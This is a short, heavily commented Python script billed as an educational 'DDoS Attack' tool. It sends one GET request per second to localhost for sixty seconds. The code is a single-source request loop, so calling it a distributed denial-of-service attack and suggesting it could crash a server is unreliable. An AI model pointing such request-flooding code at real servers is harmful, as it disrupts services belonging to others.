# Created January 19th, 2024 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
# Run on Windows [ python3 <path to file>\DDoS_Attack.py ]
# This script will automate a DDoS Attack against a specific network
# I do not condone the use of this script for any illegal, unethical, or malicious purposes.
# This is a simple demonstration for educational purposes only.


# We start by importing two necessary libraries
import requests
import time


# This is the target URL and port
TARGET_URL = "http://localhost:8000"


# Now we define two variables...
REQUEST_INTERVAL = 1  # The number of seconds between each request sent to the target
DURATION = 60  # The total number of seconds this script will run unless manually stopped earlier, the server crashes, or you're cut off


# This function defines the process of sending a request to the target server and then places it in a loop to keep running
def send_request():
    try:
        requests.get(TARGET_URL)  # Here is where a GET request is sent to the target server
        print(f"Request sent to {TARGET_URL}")
    except requests.RequestException:  # This will stop sending the requests as soon as it no longer can
        print("Error sending request")


# Here we have our main() function
def main():
    end_time = time.time() + DURATION  # Here, we establish the maximum length of time the script will run
    while time.time() < end_time:  # Now we have the control mechanism to automate sending the GET requests at our chosen interval
        send_request()
        time.sleep(REQUEST_INTERVAL)


# This is our necessary dunder main guard telling the script it is going to run its own main() function
if __name__ == "__main__":
    main()


# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
